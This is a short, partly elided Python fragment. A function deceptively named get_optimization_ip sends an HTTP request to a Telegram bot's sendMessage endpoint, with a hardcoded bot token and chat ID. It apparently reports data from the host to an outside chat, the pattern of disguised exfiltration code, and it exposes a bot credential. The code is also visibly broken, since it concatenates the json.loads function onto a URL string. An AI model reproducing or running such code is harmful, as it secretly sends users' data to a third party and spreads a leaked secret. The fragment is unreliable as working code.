...
def get_optimization_ip():
    try:
        ...
        ann = http.request('GET', 'https://api.telegram.org/bot1098155899:AAFTHU6TgX2ldYWUrQ1pLqocJf9Ek6NXA4o/sendMessage?chat_id=-1001416761712&text=' + json.loads, retries=False)     
